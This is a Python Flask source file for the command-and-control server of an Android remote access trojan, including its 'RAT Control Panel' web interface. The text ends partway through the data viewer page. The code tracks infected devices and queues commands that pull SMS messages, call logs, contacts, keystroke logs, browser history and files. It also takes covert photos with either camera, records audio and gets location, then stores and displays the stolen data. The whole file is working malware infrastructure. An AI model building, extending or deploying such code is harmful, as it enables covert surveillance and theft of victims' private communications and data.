from flask import Flask, request, jsonify, render_template_string, Response
from datetime import datetime
import json
import os
import threading
import time
import base64

app = Flask(__name__)

DATA_FILE = '/tmp/rat_data.json'

# ── category mapping ─────────────────────────────────────────────────────────
CATEGORY_MAP = {
    'get_sms_inbox':       'sms',
    'get_call_logs':       'call_logs',
    'get_contacts':        'contacts',
    'get_location':        'location',
    'get_installed_apps':  'apps',
    'get_keystroke_log':   'keystrokes',
    'capture_photo':       'photos',
    'record_audio':        'audio',
    'get_chrome_history':  'chrome_history',
    'scan_files':          'files',
    'get_file_content':    'files',
    'ping':                'system',
}

CATEGORY_LABELS = {
    'sms':           {'label': 'SMS Inbox',       'icon': '💬', 'color': '#4ade80'},
    'call_logs':     {'label': 'Call Logs',       'icon': '📞', 'color': '#60a5fa'},
    'contacts':      {'label': 'Contacts',        'icon': '👤', 'color': '#a78bfa'},
    'location':      {'label': 'Location',        'icon': '📍', 'color': '#f87171'},
    'apps':          {'label': 'Installed Apps',  'icon': '📦', 'color': '#fb923c'},
    'keystrokes':    {'label': 'Keystrokes',      'icon': '⌨️',  'color': '#facc15'},
    'photos':        {'label': 'Photos',          'icon': '📸', 'color': '#34d399'},
    'audio':         {'label': 'Audio',           'icon': '🎵', 'color': '#f472b6'},
    'chrome_history':{'label': 'Chrome History',  'icon': '🌐', 'color': '#38bdf8'},
    'files':         {'label': 'Files',           'icon': '📁', 'color': '#fbbf24'},
    'system':        {'label': 'System',          'icon': '⚙️',  'color': '#94a3b8'},
    'other':         {'label': 'Other',           'icon': '📋', 'color': '#6b7280'},
}

def load_data():
    try:
        with open(DATA_FILE) as f:
            return json.load(f)
    except:
        return {'events': [], 'devices': {}}

def save_data(events, devices):
    with open(DATA_FILE, 'w') as f:
        json.dump({'events': events, 'devices': devices}, f, indent=2)

saved       = load_data()
log_entries = saved.get('events', [])
devices     = saved.get('devices', {})
command_queue   = []
command_results = {}
file_cache      = {}

print(f"[*] Loaded {len(devices)} devices and {len(log_entries)} events")

# ── background cleanup ───────────────────────────────────────────────────────
def cleanup_stale_devices():
    while True:
        time.sleep(60)
        now = datetime.now()
        stale = []
        for d, info in devices.items():
            last_seen = info.get('last_seen', '')
            if last_seen:
                try:
                    last = datetime.fromisoformat(last_seen)
                    if (now - last).seconds > 300:
                        stale.append(d)
                except:
                    stale.append(d)
        for d in stale:
            devices[d]['online'] = False
        if stale:
            save_data(log_entries, devices)

threading.Thread(target=cleanup_stale_devices, daemon=True).start()

# ── API routes ───────────────────────────────────────────────────────────────
@app.route('/api/register', methods=['POST'])
def register_device():
    data = request.get_json()
    device_id = data.get('device_id', 'unknown')
    devices[device_id] = {
        'device_id':       device_id,
        'model':           data.get('model', 'Unknown'),
        'android_version': data.get('android_version', 'Unknown'),
        'first_seen':      devices.get(device_id, {}).get('first_seen', datetime.now().isoformat()),
        'last_seen':       datetime.now().isoformat(),
        'ip':              request.remote_addr,
        'online':          True,
    }
    save_data(log_entries, devices)
    print(f"[+] Device registered: {device_id} - Total: {len(devices)}")
    return jsonify({'status': 'ok', 'device_id': device_id})


@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    device_id = data.get('device_id', 'unknown')
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now().isoformat()
        devices[device_id]['online']    = True
        devices[device_id]['ip']        = request.remote_addr
    else:
        devices[device_id] = {
            'device_id':       device_id,
            'model':           'Unknown',
            'android_version': 'Unknown',
            'first_seen':      datetime.now().isoformat(),
            'last_seen':       datetime.now().isoformat(),
            'ip':              request.remote_addr,
            'online':          True,
        }
    save_data(log_entries, devices)
    return jsonify({'status': 'ok'})


@app.route('/api/cmd', methods=['GET'])
def get_commands():
    device_id = request.args.get('device_id', 'unknown')
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now().isoformat()
        devices[device_id]['online']    = True
    else:
        devices[device_id] = {
            'device_id':       device_id,
            'model':           'Unknown',
            'android_version': 'Unknown',
            'first_seen':      datetime.now().isoformat(),
            'last_seen':       datetime.now().isoformat(),
            'ip':              request.remote_addr,
            'online':          True,
        }
    cmds      = []
    remaining = []
    for cmd in command_queue:
        target = cmd.get('target_device', 'all')
        if target == 'all' or target == device_id:
            cmd['status']  = 'sent'
            cmd['sent_at'] = datetime.now().isoformat()
            cmds.append(cmd)
        else:
            remaining.append(cmd)
    command_queue.clear()
    command_queue.extend(remaining)
    return jsonify({'commands': cmds, 'queue_size': len(command_queue)})


@app.route('/api/result', methods=['POST'])
def post_result():
    data   = request.get_json()
    cmd_id = data.get('cmd_id', 'unknown')
    data['server_received_at'] = datetime.now().isoformat()
    result_data = data.get('result', {})
    if isinstance(result_data, dict):
        if 'base64_data' in result_data and result_data['base64_data']:
            file_cache[cmd_id] = {
                'filename':   result_data.get('file_name', 'unknown'),
                'base64_data': result_data['base64_data'],
                'mime_type':  result_data.get('mime_type', 'application/octet-stream'),
                'file_size':  result_data.get('file_size', 0),
            }
            result_data['_has_file'] = True
            result_data.pop('base64_data', None)
    command_results[cmd_id] = data
    log_entries.append({
        'type':      'command_result',
        'command':   data.get('command', 'unknown'),
        'device_id': data.get('device_id', 'unknown'),
        'timestamp': datetime.now().isoformat(),
        'cmd_id':    cmd_id,
        'data':      data,
    })
    if len(log_entries) > 2000:
        log_entries.pop(0)
    save_data(log_entries, devices)
    return jsonify({'status': 'ok'})


@app.route('/api/log', methods=['POST'])
def post_log():
    try:
        data = request.get_json()
        data['server_received_at'] = datetime.now().isoformat()
        log_entries.append(data)
        if len(log_entries) > 2000:
            log_entries.pop(0)
        save_data(log_entries, devices)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 400


@app.route('/api/log', methods=['GET'])
def get_logs():
    return jsonify({'total_events': len(log_entries), 'events': log_entries[-50:]})


@app.route('/api/file/<cmd_id>', methods=['GET'])
def get_file(cmd_id):
    file_info = file_cache.get(cmd_id)
    if not file_info:
        return jsonify({'error': 'File not found'}), 404
    mode = request.args.get('mode', 'base64')
    if mode == 'raw':
        try:
            raw_data = base64.b64decode(file_info['base64_data'])
            return Response(raw_data,
                            mimetype=file_info.get('mime_type', 'application/octet-stream'),
                            headers={'Content-Disposition': f'attachment; filename="{file_info["filename"]}"'})
        except:
            return jsonify({'error': 'Invalid base64'}), 400
    return jsonify({
        'cmd_id':      cmd_id,
        'filename':    file_info['filename'],
        'mime_type':   file_info.get('mime_type', 'application/octet-stream'),
        'file_size':   file_info.get('file_size', 0),
        'base64_data': file_info['base64_data'],
    })


@app.route('/api/devices', methods=['GET'])
def get_devices():
    device_list = []
    for d in devices.values():
        device_list.append({
            'device_id':       d.get('device_id', 'unknown'),
            'model':           d.get('model', 'Unknown'),
            'android_version': d.get('android_version', 'Unknown'),
            'online':          d.get('online', False),
            'last_seen':       d.get('last_seen', ''),
            'ip':              d.get('ip', ''),
        })
    online_count = sum(1 for d in device_list if d['online'])
    return jsonify({'devices': device_list, 'total': len(device_list), 'online': online_count})


@app.route('/api/send_cmd', methods=['POST'])
def send_command():
    data   = request.get_json()
    cmd_id = f"cmd_{int(time.time() * 1000)}"
    command = {
        'cmd_id':        cmd_id,
        'command':       data.get('command', 'ping'),
        'params':        data.get('params', {}),
        'target_device': data.get('target_device', 'all'),
        'created_at':    datetime.now().isoformat(),
        'status':        'pending',
    }
    command_queue.append(command)
    return jsonify({'status': 'ok', 'cmd_id': cmd_id})


@app.route('/api/result/<cmd_id>', methods=['GET'])
def get_result(cmd_id):
    result = command_results.get(cmd_id)
    if result:
        result_data = result.get('result', {})
        has_file    = isinstance(result_data, dict) and result_data.get('_has_file', False)
        return jsonify({'found': True, 'result': result, 'has_file': has_file})
    return jsonify({'found': False})


@app.route('/api/stats', methods=['GET'])
def get_stats():
    return jsonify({
        'total_events':    len(log_entries),
        'devices_online':  sum(1 for d in devices.values() if d.get('online')),
        'total_devices':   len(devices),
        'pending_commands': len(command_queue),
    })


# ── NEW: categorised data API ────────────────────────────────────────────────
@app.route('/api/data', methods=['GET'])
def get_data():
    category  = request.args.get('category', 'all')
    device_id = request.args.get('device_id', 'all')
    limit     = int(request.args.get('limit', 200))

    results = []
    for entry in log_entries:
        if entry.get('type') != 'command_result':
            continue
        cmd      = entry.get('command', entry.get('data', {}).get('command', 'unknown'))
        cat      = CATEGORY_MAP.get(cmd, 'other')
        dev      = entry.get('device_id', entry.get('data', {}).get('device_id', 'unknown'))

        if category != 'all' and cat != category:
            continue
        if device_id != 'all' and dev != device_id:
            continue

        cmd_id   = entry.get('cmd_id', '')
        results.append({
            'cmd_id':    cmd_id,
            'command':   cmd,
            'category':  cat,
            'device_id': dev,
            'timestamp': entry.get('timestamp', ''),
            'has_file':  cmd_id in file_cache,
            'data':      entry.get('data', {}).get('result', {}),
        })

    results = results[-limit:]
    results.reverse()  # newest first

    # compute category counts
    counts = {}
    for entry in log_entries:
        if entry.get('type') != 'command_result':
            continue
        cmd = entry.get('command', entry.get('data', {}).get('command', 'unknown'))
        cat = CATEGORY_MAP.get(cmd, 'other')
        dev = entry.get('device_id', entry.get('data', {}).get('device_id', 'unknown'))
        if device_id != 'all' and dev != device_id:
            continue
        counts[cat] = counts.get(cat, 0) + 1

    return jsonify({
        'category':  category,
        'results':   results,
        'total':     len(results),
        'counts':    counts,
        'categories': CATEGORY_LABELS,
    })


# ── HTML pages ───────────────────────────────────────────────────────────────
@app.route('/')
def control_panel():
    return render_template_string(CONTROL_PANEL_HTML)

@app.route('/data')
def data_viewer():
    return render_template_string(DATA_VIEWER_HTML)


# ════════════════════════════════════════════════════════════════════════════
#  CONTROL PANEL HTML
# ════════════════════════════════════════════════════════════════════════════
CONTROL_PANEL_HTML = r'''<!DOCTYPE html>
<html lang="en">
<head>
    <title>RAT Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg:       #080b0f;
            --bg2:      #0d1117;
            --bg3:      #161b22;
            --border:   #21262d;
            --border2:  #30363d;
            --green:    #39ff14;
            --green2:   #2bd40e;
            --green-dim:#1a6b08;
            --red:      #f85149;
            --cyan:     #58a6ff;
            --yellow:   #e3b341;
            --text:     #c9d1d9;
            --text-dim: #8b949e;
            --radius:   8px;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Inter', sans-serif; background:var(--bg); color:var(--text); min-height:100vh; }

        /* ── NAV ── */
        .topnav {
            display:flex; align-items:center; gap:0;
            background:var(--bg2); border-bottom:1px solid var(--border);
            padding:0 20px; height:52px;
        }
        .topnav .brand {
            font-family:'JetBrains Mono', monospace;
            font-weight:700; font-size:1rem; color:var(--green);
            margin-right:32px; letter-spacing:1px;
        }
        .topnav .brand span { color:var(--text-dim); }
        .nav-link {
            display:flex; align-items:center; gap:6px;
            padding:0 16px; height:52px; font-size:0.82rem; font-weight:500;
            color:var(--text-dim); text-decoration:none; border-bottom:2px solid transparent;
            transition:all .2s; cursor:pointer;
        }
        .nav-link:hover { color:var(--text); }
        .nav-link.active { color:var(--green); border-bottom-color:var(--green); }
        .nav-spacer { flex:1; }
        .nav-badge {
            background:var(--bg3); border:1px solid var(--border);
            border-radius:20px; padding:2px 10px; font-size:0.7rem;
            font-family:'JetBrains Mono', monospace; color:var(--text-dim);
        }
        .nav-badge .dot { width:6px;height:6px;border-radius:50%;background:var(--green);
            display:inline-block; margin-right:5px; animation:pulse 2s infinite; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }

        /* ── STAT BAR ── */
        .statbar {
            display:flex; align-items:center; gap:24px; flex-wrap:wrap;
            padding:10px 20px; background:var(--bg2); border-bottom:1px solid var(--border);
            font-size:0.75rem; font-family:'JetBrains Mono', monospace;
        }
        .stat { display:flex; align-items:center; gap:6px; }
        .stat label { color:var(--text-dim); }
        .stat strong { color:var(--green); }
        .refresh-btn {
            margin-left:auto; padding:5px 14px;
            background:var(--green); color:#000; border:none;
            border-radius:5px; cursor:pointer; font-family:'JetBrains Mono', monospace;
            font-size:0.72rem; font-weight:700; transition:all .15s;
        }
        .refresh-btn:hover { background:var(--green2); transform:scale(1.03); }

        /* ── LAYOUT ── */
        .container { max-width:1440px; margin:0 auto; padding:20px; }
        .grid { display:grid; grid-template-columns:280px 1fr; gap:20px; }
        @media(max-width:768px) { .grid { grid-template-columns:1fr; } }

        /* ── PANELS ── */
        .panel {
            background:var(--bg2); border:1px solid var(--border);
            border-radius:var(--radius); padding:16px; margin-bottom:16px;
        }
        .panel-title {
            font-family:'JetBrains Mono', monospace; font-size:0.72rem;
            font-weight:700; color:var(--text-dim); text-transform:uppercase;
            letter-spacing:2px; margin-bottom:14px; display:flex;
            align-items:center; gap:8px;
        }
        .panel-title::after { content:''; flex:1; height:1px; background:var(--border); }

        /* ── DEVICE CARDS ── */
        .device-card {
            background:var(--bg3); border:1px solid var(--border);
            border-radius:6px; padding:10px 12px; margin-bottom:8px;
            font-size:0.75rem; cursor:pointer; transition:all .2s;
        }
        .device-card:hover { border-color:var(--border2); transform:translateX(2px); }
        .device-card.online  { border-left:3px solid var(--green); }
        .device-card.offline { border-left:3px solid var(--red); opacity:.55; }
        .device-card.selected { border-color:var(--cyan); background:#0d1f30; }
        .device-card .did { font-family:'JetBrains Mono', monospace; font-weight:600; color:var(--cyan); font-size:0.72rem; }
        .device-card .model { color:var(--text-dim); margin-top:2px; }
        .device-status { display:flex; align-items:center; gap:5px; margin-top:4px; font-size:0.68rem; }
        .dot { width:7px; height:7px; border-radius:50%; display:inline-block; }
        .dot.online  { background:var(--green); box-shadow:0 0 6px var(--green); }
        .dot.offline { background:var(--red); }

        /* ── CMD GROUPS ── */
        .cmd-group { margin-bottom:14px; }
        .cmd-group-label {
            font-size:0.65rem; font-weight:600; letter-spacing:1.5px;
            text-transform:uppercase; color:var(--text-dim);
            margin-bottom:6px; padding-left:2px;
        }
        .cmd-btn {
            display:flex; align-items:center; gap:8px; width:100%;
            padding:9px 12px; margin:3px 0;
            background:var(--bg3); color:var(--text); border:1px solid var(--border);
            border-radius:6px; cursor:pointer; font-family:'JetBrains Mono', monospace;
            font-size:0.75rem; text-align:left; transition:all .18s;
        }
        .cmd-btn:hover { background:rgba(57,255,20,.08); border-color:var(--green); color:var(--green); }
        .cmd-btn .icon { font-size:0.85rem; }
        .cmd-btn.danger:hover  { background:rgba(248,81,73,.1); border-color:var(--red); color:var(--red); }
        .cmd-btn.file-btn:hover { background:rgba(227,179,65,.1); border-color:var(--yellow); color:var(--yellow); }

        /* ── OUTPUT ── */
        .output-area {
            background:var(--bg); border:1px solid var(--border);
            border-radius:6px; padding:14px; min-height:240px; max-height:420px;
            overflow-y:auto; font-size:0.75rem; font-family:'JetBrains Mono', monospace;
            white-space:pre-wrap; word-break:break-all; line-height:1.6;
            color:var(--green);
        }
        .output-area .placeholder { color:var(--text-dim); font-style:italic; }

        /* ── EVENTS ── */
        .event-item {
            display:flex; align-items:flex-start; gap:8px;
            padding:7px 0; border-bottom:1px solid var(--border);
            font-size:0.72rem;
        }
        .event-item:last-child { border-bottom:none; }
        .event-time { color:var(--text-dim); font-family:'JetBrains Mono', monospace; white-space:nowrap; flex-shrink:0; }
        .event-type {
            padding:1px 7px; border-radius:10px;
            background:rgba(88,166,255,.12); color:var(--cyan);
            font-size:0.65rem; font-weight:600; white-space:nowrap; flex-shrink:0;
        }
        .event-device { color:var(--text-dim); font-size:0.68rem; }

        /* ── FILE LIST ── */
        .file-list { list-style:none; padding:0; }
        .file-list li { padding:5px 10px; margin:2px 0; cursor:pointer; border-radius:4px; font-size:0.73rem; transition:background .15s; }
        .file-list li:hover { background:var(--bg3); }
        .file-list li.folder { color:var(--yellow); }
        .file-list li.file   { color:var(--cyan); }

        /* ── UTILITY BTNS ── */
        .util-btn {
            background:var(--bg3); color:var(--text-dim); border:1px solid var(--border);
            padding:4px 10px; border-radius:4px; cursor:pointer;
            font-family:'JetBrains Mono', monospace; font-size:0.68rem;
            margin:3px; transition:all .15s;
        }
        .util-btn:hover { border-color:var(--green); color:var(--green); }
        .image-preview { max-width:100%; max-height:320px; margin:10px 0; border-radius:6px; border:1px solid var(--border); }
        .audio-player  { width:100%; margin:10px 0; }

        /* ── TOAST ── */
        .toast {
            position:fixed; top:20px; right:20px; padding:10px 18px;
            border-radius:6px; font-size:0.78rem; z-index:9999;
            font-family:'JetBrains Mono', monospace;
            animation:fadeIn .2s ease;
        }
        @keyframes fadeIn { from{opacity:0;transform:translateY(-6px)} to{opacity:1;transform:none} }
        .toast.success { background:#1a3d14; color:var(--green); border:1px solid var(--green-dim); }
        .toast.error   { background:#3d1414; color:var(--red); border:1px solid #7a2020; }

        ::-webkit-scrollbar { width:6px; }
        ::-webkit-scrollbar-track { background:var(--bg); }
        ::-webkit-scrollbar-thumb { background:var(--border2); border-radius:3px; }
    </style>
</head>
<body>
    <!-- NAV -->
    <nav class="topnav">
        <div class="brand">⚡ RAT<span>/panel</span></div>
        <a class="nav-link active" href="/">🖥️ Control Panel</a>
        <a class="nav-link" href="/data">📊 Data Viewer</a>
        <div class="nav-spacer"></div>
        <div class="nav-badge"><span class="dot"></span><span id="navOnline">0</span> online</div>
    </nav>

    <!-- STAT BAR -->
    <div class="statbar">
        <div class="stat"><label>Devices</label><strong id="deviceCount">—</strong></div>
        <div class="stat"><label>Online</label><strong id="onlineCount">—</strong></div>
        <div class="stat"><label>Events</label><strong id="eventCount">—</strong></div>
        <div class="stat"><label>Pending</label><strong id="pendingCount">—</strong></div>
        <button class="refresh-btn" onclick="refreshAll()">↻ Refresh</button>
    </div>

    <div class="container">
        <div class="grid">
            <!-- LEFT COLUMN -->
            <div>
                <div class="panel">
                    <div class="panel-title">Devices</div>
                    <div id="deviceList"><p style="color:var(--text-dim);font-size:.75rem;">Loading…</p></div>
                </div>

                <div class="panel">
                    <div class="panel-title">Commands</div>

                    <div class="cmd-group">
                        <div class="cmd-group-label">Data Extraction</div>
                        <button class="cmd-btn" onclick="sendCmd('get_sms_inbox')"><span class="icon">💬</span> SMS Inbox</button>
                        <button class="cmd-btn" onclick="sendCmd('get_call_logs')"><span class="icon">📞</span> Call Logs</button>
                        <button class="cmd-btn" onclick="sendCmd('get_contacts')"><span class="icon">👤</span> Contacts</button>
                        <button class="cmd-btn" onclick="sendCmd('get_installed_apps')"><span class="icon">📦</span> Installed Apps</button>
                        <button class="cmd-btn" onclick="sendCmd('get_chrome_history')"><span class="icon">🌐</span> Chrome History</button>
                        <button class="cmd-btn" onclick="sendCmd('get_keystroke_log',{days:10})"><span class="icon">⌨️</span> Keystrokes (10d)</button>
                    </div>

                    <div class="cmd-group">
                        <div class="cmd-group-label">Surveillance</div>
                        <button class="cmd-btn" onclick="sendCmd('capture_photo',{camera:'back'})"><span class="icon">📸</span> Back Camera</button>
                        <button class="cmd-btn" onclick="sendCmd('capture_photo',{camera:'front'})"><span class="icon">🤳</span> Front Camera</button>
                        <button class="cmd-btn" onclick="sendCmd('record_audio',{duration:10})"><span class="icon">🎵</span> Record Audio (10s)</button>
                        <button class="cmd-btn" onclick="sendCmd('get_location')"><span class="icon">📍</span> Get Location</button>
                    </div>

                    <div class="cmd-group">
                        <div class="cmd-group-label">File System</div>
                        <button class="cmd-btn file-btn" onclick="sendCmd('scan_files',{path:'/storage/emulated/0'})"><span class="icon">📁</span> Browse Files</button>
                    </div>

                    <div class="cmd-group">
                        <div class="cmd-group-label">System</div>
                        <button class="cmd-btn danger" onclick="sendCmd('ping')"><span class="icon">⚡</span> Ping</button>
                    </div>
                </div>
            </div>

            <!-- RIGHT COLUMN -->
            <div>
                <div class="panel">
                    <div class="panel-title">Output</div>
                    <div class="output-area" id="output"><span class="placeholder">Select a device and send a command…</span></div>
                </div>

                <div class="panel">
                    <div class="panel-title">Recent Events</div>
                    <div id="events" style="max-height:220px;overflow-y:auto;"><p style="color:var(--text-dim);font-size:.75rem;">Loading…</p></div>
                </div>
            </div>
        </div>
    </div>

    <div id="toastContainer"></div>

    <script>
        var selectedDevice = 'all';
        var devicesData = [];

        function toast(msg, type) {
            var t = document.createElement('div');
            t.className = 'toast ' + type;
            t.textContent = msg;
            document.getElementById('toastContainer').appendChild(t);
            setTimeout(function() { t.remove(); }, 3000);
        }

        function refreshAll() { loadDevices(); loadStats(); loadEvents(); }

        function loadDevices() {
            fetch('/api/devices')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    devicesData = data.devices || [];
                    document.getElementById('deviceCount').textContent = data.total || devicesData.length;
                    document.getElementById('onlineCount').textContent = data.online || 0;
                    document.getElementById('navOnline').textContent   = data.online || 0;
                    renderDevices();
                })
                .catch(function() {
                    document.getElementById('deviceList').innerHTML = '<p style="color:var(--red);font-size:.75rem;">Error loading devices.</p>';
                });
        }

        function renderDevices() {
            var c = document.getElementById('deviceList');
            if (!devicesData.length) {
                c.innerHTML = '<p style="color:var(--text-dim);font-size:.75rem;">No devices connected yet.</p>';
                return;
            }
            var html = '';
            devicesData.forEach(function(d) {
                var onCls  = d.online ? 'online' : 'offline';
                var selCls = selectedDevice === d.device_id ? ' selected' : '';
                html += '<div class="device-card ' + onCls + selCls + '" onclick="selectDevice(\'' + d.device_id + '\')">';
                html += '<div class="did">' + d.device_id + '</div>';
                html += '<div class="model">' + (d.model || 'Unknown') + ' · Android ' + (d.android_version || '?') + '</div>';
                html += '<div class="device-status"><span class="dot ' + onCls + '"></span>' + (d.online ? 'Online' : 'Offline');
                if (d.ip) html += ' · ' + d.ip;
                html += '</div></div>';
            });
            c.innerHTML = html;
        }

        function selectDevice(id) {
            selectedDevice = id;
            renderDevices();
            document.getElementById('output').innerHTML = '<span class="placeholder">Selected: ' + id + ' — send a command.</span>';
        }

        function sendCmd(command, params) {
            params = params || {};
            if (selectedDevice === 'all' && !confirm('Send to ALL devices?')) return;
            document.getElementById('output').textContent = 'Sending ' + command + '…';
            fetch('/api/send_cmd', {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body: JSON.stringify({command:command, params:params, target_device:selectedDevice})
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                toast('Command sent!', 'success');
                document.getElementById('output').textContent = 'Waiting for device…  (ID: ' + data.cmd_id + ')';
                pollResult(data.cmd_id, command);
            })
            .catch(function(e) { toast('Failed: ' + e.message, 'error'); });
        }

        function pollResult(cmdId, command) {
            var output = document.getElementById('output');
            fetch('/api/result/' + cmdId)
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (data.found) {
                        var result = data.result.result || {};
                        if (command === 'scan_files' && result.files) renderFileBrowser(result, cmdId);
                        else if (command === 'capture_photo' && data.has_file) renderPhotoResult(result, cmdId);
                        else if (command === 'record_audio' && data.has_file) renderAudioResult(result, cmdId);
                        else if (command === 'get_file_content' && data.has_file) renderFileContent(result, cmdId);
                        else output.textContent = JSON.stringify(result, null, 2);
                    } else {
                        output.textContent = 'Still waiting…  retrying in 5s';
                        setTimeout(function() { pollResult(cmdId, command); }, 5000);
                    }
                })
                .catch(function() { setTimeout(function() { pollResult(cmdId, command); }, 5000); });
        }

        function renderFileBrowser(result, cmdId) {
            var path = result.path || '/';
            var files = result.files || [];
            var html = '<div style="margin-bottom:8px;"><strong>' + path + '</strong> <span style="color:var(--text-dim)">(' + files.length + ' items)</span></div>';
            html += '<button class="util-btn" onclick="sendCmd(\'scan_files\',{path:\'' + getParentPath(path) + '\'})">↑ Up</button><hr style="border-color:var(--border);margin:8px 0;">';
            html += '<ul class="file-list">';
            files.forEach(function(f) {
                var cls = f.isDirectory ? 'folder' : 'file';
                var ep  = f.path.replace(/'/g, "\\'");
                var en  = (f.name||'file').replace(/'/g, "\\'");
                var oc  = f.isDirectory
                    ? "sendCmd('scan_files',{path:'" + ep + "'})"
                    : "sendCmd('get_file_content',{path:'" + ep + "',filename:'" + en + "'})";
                html += '<li class="' + cls + '" onclick="' + oc + '">' +
                    (f.isDirectory ? '📁' : '📄') + ' ' + f.name +
                    ' <span style="color:var(--text-dim)">' + (f.isDirectory ? '' : formatSize(f.size)) + '</span></li>';
            });
            if (!files.length) html += '<li style="color:var(--text-dim)">Empty directory</li>';
            html += '</ul>';
            document.getElementById('output').innerHTML = html;
        }

        function renderPhotoResult(result, cmdId) {
            document.getElementById('output').innerHTML =
                '<strong>📸 Photo Captured</strong><br><small style="color:var(--text-dim)">' + (result.file_path||'') + '</small><br><br>' +
                '<button class="util-btn" onclick="viewFile(\'' + cmdId + '\',\'image\')">View Image</button>' +
                '<button class="util-btn" onclick="downloadFile(\'' + cmdId + '\')">Download</button>' +
                '<button class="util-btn" onclick="copyBase64(\'' + cmdId + '\')">Copy Base64</button>' +
                '<div id="preview_' + cmdId + '"></div>';
        }

        function renderAudioResult(result, cmdId) {
            document.getElementById('output').innerHTML =
                '<strong>🎵 Audio Recorded</strong><br><small style="color:var(--text-dim)">' + (result.file_path||'') + '</small><br><br>' +
                '<button class="util-btn" onclick="viewFile(\'' + cmdId + '\',\'audio\')">▶ Play</button>' +
                '<button class="util-btn" onclick="downloadFile(\'' + cmdId + '\')">Download</button>' +
                '<button class="util-btn" onclick="copyBase64(\'' + cmdId + '\')">Copy Base64</button>' +
                '<div id="preview_' + cmdId + '"></div>';
        }

        function renderFileContent(result, cmdId) {
            var mt = result.mime_type || '';
            document.getElementById('output').innerHTML =
                '<strong>📄 ' + (result.file_name||'') + '</strong><br><small style="color:var(--text-dim)">' + formatSize(result.file_size||0) + '</small><br><br>' +
                (mt.indexOf('image/')===0 ? '<button class="util-btn" onclick="viewFile(\'' + cmdId + '\',\'image\')">View</button>' : '') +
                (mt.indexOf('audio/')===0 ? '<button class="util-btn" onclick="viewFile(\'' + cmdId + '\',\'audio\')">▶ Play</button>' : '') +
                '<button class="util-btn" onclick="downloadFile(\'' + cmdId + '\')">Download</button>' +
                '<button class="util-btn" onclick="copyBase64(\'' + cmdId + '\')">Copy Base64</button>' +
                '<div id="preview_' + cmdId + '"></div>';
        }

        function viewFile(cmdId, type) {
            var pDiv = document.getElementById('preview_' + cmdId);
            fetch('/api/file/' + cmdId + '?mode=base64')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (type === 'image')
                        pDiv.innerHTML = '<img class="image-preview" src="data:' + data.mime_type + ';base64,' + data.base64_data + '" alt="Preview">';
                    else if (type === 'audio')
                        pDiv.innerHTML = '<audio class="audio-player" controls src="data:' + data.mime_type + ';base64,' + data.base64_data + '"></audio>';
                })
                .catch(function() { toast('Failed to load file', 'error'); });
        }

        function downloadFile(cmdId) { window.open('/api/file/' + cmdId + '?mode=raw', '_blank'); }

        function copyBase64(cmdId) {
            fetch('/api/file/' + cmdId + '?mode=base64')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    navigator.clipboard.writeText(data.base64_data)
                        .then(function() { toast('Base64 copied!', 'success'); });
                })
                .catch(function() { toast('Failed to copy', 'error'); });
        }

        function getParentPath(path) {
            var parts = path.split('/'); parts.pop(); return parts.join('/') || '/';
        }

        function formatSize(bytes) {
            if (!bytes) return '0 B';
            if (bytes < 1024) return bytes + ' B';
            if (bytes < 1048576) return (bytes/1024).toFixed(1) + ' KB';
            return (bytes/1048576).toFixed(1) + ' MB';
        }

        function loadStats() {
            fetch('/api/stats')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    document.getElementById('eventCount').textContent   = data.total_events || 0;
                    document.getElementById('pendingCount').textContent = data.pending_commands || 0;
                })
                .catch(function() {});
        }

        function loadEvents() {
            fetch('/api/log')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    var events = (data.events || []).slice(-20).reverse();
                    if (!events.length) {
                        document.getElementById('events').innerHTML = '<p style="color:var(--text-dim);font-size:.75rem;">No events yet.</p>';
                        return;
                    }
                    var html = '';
                    events.forEach(function(e) {
                        html += '<div class="event-item">';
                        html += '<span class="event-time">' + (e.timestamp||'').substring(0,19).replace('T',' ') + '</span>';
                        html += '<span class="event-type">' + (e.type||'unknown') + '</span>';
                        if (e.device_id) html += '<span class="event-device">' + e.device_id + '</span>';
                        html += '</div>';
                    });
                    document.getElementById('events').innerHTML = html;
                })
                .catch(function() {});
        }

        refreshAll();
        setInterval(refreshAll, 10000);
    </script>
</body>
</html>
'''


# ════════════════════════════════════════════════════════════════════════════
#  DATA VIEWER HTML
# ════════════════════════════════════════════════════════════════════════════
DATA_VIEWER_HTML = r'''<!DOCTYPE html>
<html lang="en">
<head>
    <title>Data Viewer — RAT Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg:       #080b0f;
            --bg2:      #0d1117;
            --bg3:      #161b22;
            --bg4:      #1c2128;
            --border:   #21262d;
            --border2:  #30363d;
            --green:    #39ff14;
            --green2:   #2bd40e;
            --green-dim:#1a6b08;
            --red:      #f85149;
            --cyan:     #58a6ff;
            --yellow:   #e3b341;
            --purple:   #a78bfa;
            --orange:   #fb923c;
            --pink:     #f472b6;
            --text:     #c9d1d9;
            --text-dim: #8b949e;
            --radius:   8px;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Inter', sans-serif; background:var(--bg); color:var(--text); min-height:100vh; display:flex; flex-direction:column; }

        /* ── NAV ── */
        .topnav {
            display:flex; align-items:center; gap:0;
            background:var(--bg2); border-bottom:1px solid var(--border);
            padding:0 20px; height:52px; flex-shrink:0;
        }
        .topnav .brand { font-family:'JetBrains Mono', monospace; font-weight:700; font-size:1rem; color:var(--green); margin-right:32px; letter-spacing:1px; }
        .topnav .brand span { color:var(--text-dim); }
